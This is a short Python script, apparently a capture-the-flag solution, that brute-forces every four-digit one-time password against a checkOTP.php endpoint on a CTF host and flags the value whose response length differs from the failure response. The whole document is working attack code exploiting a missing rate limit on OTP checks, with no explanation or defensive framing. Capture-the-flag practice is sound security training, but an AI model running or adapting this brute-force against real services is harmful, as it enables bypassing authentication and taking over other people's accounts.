import requests

for i in range(1000, 10000):
  url = f"http://ctf.segfaulthub.com:1129/6/checkOTP.php?otpNum={i}"
  response = requests.get(url)
  if len(response.content) != 83:
    print(i, "true")
    break
